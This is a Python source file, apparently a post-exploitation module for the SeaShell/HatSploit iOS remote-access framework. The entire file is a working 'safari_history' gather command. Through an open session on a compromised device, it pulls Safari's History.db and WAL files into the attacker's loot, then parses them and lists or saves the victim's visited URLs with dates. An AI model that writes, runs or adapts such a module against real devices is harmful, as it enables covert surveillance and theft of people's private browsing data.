"""
This command requires SeaShell: https://github.com/EntySec/SeaShell
Current source: https://github.com/EntySec/SeaShell
"""

import json

from seashell.lib.loot import Loot
from pex.db import DB

from hatsploit.lib.command import Command


class HatSploitCommand(Command):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "gather",
            'Name': "safari_history",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "View Safari history or save as json.",
            'Usage': "safari_history [local_file]",
            'MinArgs': 0
        }

        self.db = DB()

        self.db_file = '/private/var/mobile/Library/Safari/History.db'
        self.wal_file = '/private/var/mobile/Library/Safari/History.db-wal'

    def run(self, argc, argv):
        if not self.session.download(
                self.db_file, Loot().specific_loot('History.db')):
            return

        if not self.session.download(
                self.wal_file, Loot().specific_loot('History.db-wal')):
            return

        self.print_process("Parsing history database...")

        try:
            history = self.db.parse_safari_history(
                Loot().specific_loot('History.db'))
        except Exception:
            self.print_error("Failed to parse history database!")
            return

        if argc >= 2:
            with open(argv[1], 'w') as f:
                self.print_process(f"Saving history to {argv[1]}...")
                json.dump(history, f)

            self.print_success(f"Saved history to {argv[1]}!")
            return

        history_data = []

        for item in history:
            history_data.append((item['date'], item['details']['url']))

        if history_data:
            self.print_table("History", ('Date', 'URL'), *history_data)
        else:
            self.print_warning("No history available on device.")
